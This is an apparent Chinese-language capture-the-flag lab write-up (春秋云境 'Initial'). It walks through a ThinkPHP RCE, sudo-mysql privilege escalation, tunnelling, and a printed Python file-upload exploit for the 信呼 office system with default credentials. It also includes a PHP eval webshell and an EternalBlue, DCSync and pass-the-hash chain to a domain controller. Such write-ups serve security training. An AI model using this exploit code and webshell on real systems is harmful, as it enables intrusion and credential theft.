---
title: 春秋云境Initial wp
url: https://mp.weixin.qq.com/s/jCEgDXzXP3YCtndNViUC4Q
source: Doonsec's feed
date: 2026-02-15
fetch_date: 2026-02-16T04:18:03.696074
---

# 春秋云境Initial wp

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/dscLuiaicVquM2Rb7Uhg1ibBicNhRZQ9mtmPZPDoEvrnLaYWmXp3kmic5E926V8Ay8R5waTIu1vcrQg8yHWO4D7l9pzKicxBMSTeKfYAJotvJVH78/0?wx_fmt=jpeg)

# 春秋云境Initial wp

OOO
OOO

船山信安

![]()

在小说阅读器中沉浸阅读

flag1

![image-20260215131004497](https://mmbiz.qpic.cn/mmbiz_png/dscLuiaicVquM2ib58x95cQ37bn7E97sBPZgXaeEcfmlicG8nVRNvwwCwIdVylHZSKic2MMUoq5Hb3sPGrnqMhOUaq41sU0gE1AlVP6jbTpvT3MA/640?wx_fmt=png&from=appmsg)

image-20260215131004497

这里进来是一个登录的页面，但其实它不能登录，于是使用Tscan进行端口扫描

![image-20260215131626563](https://mmbiz.qpic.cn/mmbiz_png/dscLuiaicVquNQet8nEelibZ2lEiclUTkZBLvvZwvU9nbH31zq5xIvTJfsaOHBkiboYOSstdA07fv1nClAnGjsibb69SqQKegE5J6OMOITBGeRWAI/640?wx_fmt=png&from=appmsg)

发现web服务是用ThinkPHP搭建的（从网站图标也能知道）

![image-20260215131815801](https://mmbiz.qpic.cn/sz_mmbiz_png/dscLuiaicVquNzelCrnkCMptvg4vk12SsG3rrP0y1E5jIZXq8qlukddEbAVeicibHjrL3YPnUqTnokiaSMgMGxsEicPgGziakPHcVicWjm5mQlOCegk/640?wx_fmt=png&from=appmsg)

image-20260215131815801

接下来就是使用ThinkPHP漏洞检测工具（工具地址：https://github.com/AgonySec/ThinkPHPGUI）

![image-20260215132133564](https://mmbiz.qpic.cn/sz_mmbiz_png/dscLuiaicVquObKNIHeSUNibtNhnjQAGianUZ2zMu6hicJXTEhpWZnAViaY1JWehfxUf0ic0qWEXkhIibur24ppaxlJSDfZDnUKXPr7um9Xtv2cNrkQ/640?wx_fmt=png&from=appmsg)

image-20260215132133564

存在RCE漏洞，直接getshell，然后使用蚁剑连接

![image-20260215132552052](https://mmbiz.qpic.cn/sz_mmbiz_png/dscLuiaicVquPTUIniaDBD0yEhiaZIejpkp4usWicrzAOv5nCWMibZW1OGA2uoR6FqGU4m5x1opIrJhpVIZg2wOsib5OmKZsxDBLy3RCTgW9Sd5uuw/640?wx_fmt=png&from=appmsg)

image-20260215132552052

使用蚁剑的虚拟终端，但是当前用户是www-data，尝试过后发现权限低（无权限读取/root），必须得提权

![image-20260215133617897](https://mmbiz.qpic.cn/sz_mmbiz_png/dscLuiaicVquNAK7u6BN0qHGBWO6EAkDfiaYUwRGy9YtRgNvmnbgvFkuzeic9SUBPBTqXXFJ8Zcjpgq4SRwK8hC2WNDFy1Dqaq2aLhETYXeRg2s/640?wx_fmt=png&from=appmsg)

image-20260215133617897

使用sudo -l枚举，结果发现sudo可以无密码运行/usr/bin/mysql

![](https://mmbiz.qpic.cn/mmbiz_png/dscLuiaicVquO31fz10Rsa4labLdd4VpIg81o73ZrOUJ5wUcMkLfsjkWY3eLLPgRuSC6mAUGWvpeF27l7UKY0GcpLGEhkGVb8Uq17x5WLCnbg/640?wx_fmt=png&from=appmsg)

在root目录下发现了flag目录

![image-20260215134530643](https://mmbiz.qpic.cn/sz_mmbiz_png/dscLuiaicVquNjzvtKzI4L034nvo35oZ1iaBqxicOVmUYws1ZFUUezjVcADwpjDqEtKjKy6LxXKpyjsdU0OHaO79c7IlXnQW2kbPOJMkCnYONQ0/640?wx_fmt=png&from=appmsg)

image-20260215134530643

获得第一个flag！

![image-20260215135119475](https://mmbiz.qpic.cn/mmbiz_png/dscLuiaicVquMqI2W6ZianRlBswYAiaht47RTpGqOUibXQah1cj3RZVptFDpv7BEtHTNCcGibCSTLxtnUIRIpX0h3yp23wt5b3ScHSian1ibJ0Efmicc/640?wx_fmt=png&from=appmsg)

image-20260215135119475

**注意：**在mysql的 -e 参数中直接运行Shell命令时，必须使用`\!`（反斜杠 + 感叹号）来告诉MySQL这不是SQL语句，而是一个系统命令。

```
flag01：flag{60b53231-
```

## flag2

使用蚁剑的虚拟终端上传fscan，并使用ifconfig查看当前ip

![image-20260215140343017](https://mmbiz.qpic.cn/mmbiz_png/dscLuiaicVquOVf4GVXnASicwTxI4wiaSghcbjLBEkzdqlFfxIIzicE200XzYewbBfhvoYteYw1HbQQbllgH8c9J8r63L3gEkv77aLn8XAO1micVM/640?wx_fmt=png&from=appmsg)

image-20260215140343017

![image-20260215140747166](https://mmbiz.qpic.cn/mmbiz_png/dscLuiaicVquO5TkXVTBl8xWX8iaMFlYsHx21BfiabcrW7ILMYoLtcWeyUmOxoKgvicUyIqU3jia9E0OF3S7bShbibXSCxXCfq9FtmPl2eogSxGynA/640?wx_fmt=png&from=appmsg)

image-20260215140747166

使用fscan扫描，扫描发现主机`172.22.1.18`开放了 Web 服务，指纹显示为“信呼协同办公系统”，为进一步攻击，使用Venom搭建隧道

![image-20260215141206515](https://mmbiz.qpic.cn/mmbiz_png/dscLuiaicVquMoTENKPLTzBkv86lQlb4mhYYBfptQNzicu8QvZZnNx5ad4ZiaOA8kgnsADnvyNCJdZkdHWmnjicL8Rr1GyYRnVEO59DtkRHib6LnY/640?wx_fmt=png&from=appmsg)

image-20260215141206515

在服务器1080 端口开启 SOCKS5 代理

![](https://mmbiz.qpic.cn/mmbiz_png/dscLuiaicVquOHtM1EJJO1ujYvnTfqXtVzrXv4LGkFNeKHqbq5jts0iaibE9NJn88G9q7P4o9EcLY4gR2tmGhPy3T7vk2LicUDiayB9yqcDaRXJ0A/640?wx_fmt=png&from=appmsg)

成功在本机上访问办公系统

![image-20260215145044771](https://mmbiz.qpic.cn/mmbiz_png/dscLuiaicVquMYUmsUB7rSrKVcb0drvRarEYIxq89c9N6DyQsfUqdlicK89ER9dARBbDpZTQwYCERLX7HRrdIm0X8MorrwyexYT9qIDVRAFePo/640?wx_fmt=png&from=appmsg)

image-20260215145044771

存在弱口令admin/admin123，网络上搜索发现存在文件上传漏洞，使用公开的POC对其进行攻击

```
import requests
session = requests.session()
url_pre = 'http://172.22.1.18/'
url1 = url_pre + '?a=check&m=login&d=&ajaxbool=true&rnd=533953'
url2 = url_pre + '/index.php?a=upfile&m=upload&d=public&maxsize=100&ajaxbool=true&rnd=798913'
url3 = url_pre + '/task.php?m=qcloudCos|runt&a=run&fileid=11'
data1 = {
    'rempass': '0',
    'jmpass': 'false',
    'device': '1625884034525',
    'ltype': '0',
    'adminuser': 'YWRtaW4=::',
    'adminpass': 'YWRtaW4xMjM=',
    'yanzm': ''
}
r = session.post(url1, data=data1)
r = session.post(url2, files={'file': open('1.php', 'r+')})
filepath = str(r.json()['filepath'])
filepath = "/" + filepath.split('.uptemp')[0] + '.php'
id = r.json()['id']
url3 = url_pre + f'/task.php?m=qcloudCos|runt&a=run&fileid={id}'
r = session.get(url3)
r = session.get(url_pre + filepath)
print(r.text)
print(url_pre + filepath)
```

在同目录下放一个1.php

```
<?=eval($_POST['cmd']);?>
```

使用蚁剑连接（蚁剑也需要配代理）

![image-20260215155848547](https://mmbiz.qpic.cn/mmbiz_png/dscLuiaicVquMVSspaiaKhG7iaHeb6oyrehxkJbJqEBdI3O6iaRGgDp1FX0ahr6aGAbm9WVTPQtKl2kRkYOQiaYaJ68ibPjGasZPiaHNn5dmCPBwY3A/640?wx_fmt=png&from=appmsg)

image-20260215155848547

注意：进行文件读取，由于是windows系统，读取文件命令用**type**

![image-20250820164933238](https://mmbiz.qpic.cn/mmbiz_png/dscLuiaicVquOMJU6ibAsIAfAbyRqord59MP39siaKWh0IOfn05arspIjGrtO4diaGP4Ibewc38nRSAS1MrhYRITNhEQS15Gj7ibpOW6JGHgBvz9E/640?wx_fmt=png&from=appmsg)

image-20250820164933238

```
flag02：2ce3-4813-87d4-
```

## flag3

![image-20260215160844678](https://mmbiz.qpic.cn/sz_mmbiz_png/dscLuiaicVquOECxOqen4oC5ozgZPsicmIP6k0fwBNNa7w2KBVNEvPf0GrlP2SVlSicV3TicYgWWNicQY4NB21SotEVc6vicb3lm8yViaM3LrSiaibyqU/640?wx_fmt=png&from=appmsg)

image-20260215160844678

回看一下fscan的结果，172.22.1.21 Windows的机器并且存在MS17-010漏洞，现在就开始打永恒之蓝，使用MSF+Venom代理隧道，成功

![image-20260215183211871](https://mmbiz.qpic.cn/mmbiz_png/dscLuiaicVquN6yshopKWaZISw6O4Aw5RCAw6BL77fWJ2WnTGntPmmicbjWwdtp4iaibia0rKd0GDOZJNujw73AsmdEP2yxKibq2ibS8TOkibu8bibNZo/640?wx_fmt=png&from=appmsg)

image-20260215183211871

接下来执行**load kiwi**（加载密码抓取插件）和**creds\_all**（抓取域管理员 administrator 的明文密码），但是失败只有机器账号

![image-20260215183416146](https://mmbiz.qpic.cn/mmbiz_png/dscLuiaicVquMDY6f8W0SBd1oHD4DSEj39yRcQxwKOOVVEphStvwianHWBZ5ctbaXSvVibkulyiagrDMANfj8iceWqLCO2JOubOUCbjPWrVF2aVQ0/640?wx_fmt=png&from=appmsg)

image-20260215183416146

尝试 **DCSync** 攻击（在不直接登录`域控`的情况下，远程导出域内所有账号的密码哈希），获得了admin的哈希

![image-20260215184323746](https://mmbiz.qpic.cn/sz_mmbiz_png/dscLuiaicVquM6fRIv8qZraLRqia8fSWAgmynENH1CSjo1CtsgaibbdQxtlMvEQvD39BUWu4Ha0q1Un1YhoiastQCzkaWzWPRU4K2dgdnoNBiaBN8/640?wx_fmt=png&from=appmsg)

image-20260215184323746

然后采用 **Pass-the-Hash (PtH)** 技术，绕过明文密码破解阶段，通过 `psexec` 模块成功在域控 `172.22.1.2` 上建立会话。

![image-20260215184946418](https://mmbiz.qpic.cn/sz_mmbiz_png/dscLuiaicVquOgFo9sYKCibGnZO5OxzAJvdNL9XbkSZibL59JehyuPcYic8AUTe74f3YVF14qy8LHpwyboedyicvxekXOC06s8iaw3IKXIxuqcxxFM/640?wx_fmt=png&from=appmsg)

image-20260215184946418

由于 Meterpreter 交互环境与 Windows 原生 Cmd 环境存在命令差异，通过执行 `shell` 命令切换至目标主机系统命令行，通过 `dir /s /b C:\flag*` 命令进行全盘递归搜索，最终定位到 flag03 的确切物理路径。

![image-20260215185203171](https://mmbiz.qpic.cn/mmbiz_png/dscLuiaicVquNF3wac3nLyKxFsdtWr54MYMUOW0FULo6qhhKw6GmCZMkCmDQ6aermA6jbxVqpzCGaJpicOABCRdwWuHDFic7o3pxKkIqNOzibNCI/640?wx_fmt=png&from=appmsg)

image-20260215185203171

成功拿下第三个flag

```
flag03：e8f88d0d43d6}
```

附上攻克截图

![image-20260215185323700](https://mmbiz.qpic.cn/mmbiz_png/dscLuiaicVquNUlRm0UnIlpxqbUV1ptNPibLejqQKe1rHapjnmG94JIks3ZgWw0M0mBEcvECKC9qx1LD0DjXl14DHkaCUOTkgMD8j5EFjNhUg4/640?wx_fmt=png&from=appmsg)

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/7nIrJAgaibicP80khZp3raYsnCBL854MQ5ouD4zwyygRyXGlvOFEsx69v1ml1s65gia6wwql6v17n12j2CXZibO0ZA/0?wx_fmt=png)

船山信安

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/7nIrJAgaibicP80khZp3raYsnCBL854MQ5ouD4zwyygRyXGlvOFEsx69v1ml1s65gia6wwql6v17n12j2CXZibO0ZA/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过